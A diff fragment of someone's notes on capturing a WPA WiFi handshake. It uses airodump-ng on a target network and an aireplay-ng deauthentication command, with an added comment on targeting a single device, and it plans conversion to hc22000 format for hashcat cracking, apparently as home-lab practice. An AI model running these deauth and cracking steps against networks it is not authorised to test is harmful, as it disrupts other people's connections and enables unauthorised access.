@@ -21,7 +21,7 @@ sudo airodump-ng -c [CH] --bssid [BSSID] -w ~/Downloads/test wlan0            #w
 
 and while monitoring the router, lets deauthenticate something from the router (like a phone...or anything)
 
-sudo aireplay-ng -0 5 -a [BSSID] wlan0
+sudo aireplay-ng -0 5 -a [BSSID] wlan0                         # with adding -c [STATION] i can pull off one specific device from the network
 
 And when you will get a handshake then you will get a file, a .cap file, which is not good for me (can not use with hashcat)...so lets create a hc22000 format from it: 
 /////side quest...the virtual machine can't use my GPU's full potential. So i've created a shared folder on my Endeavour with:
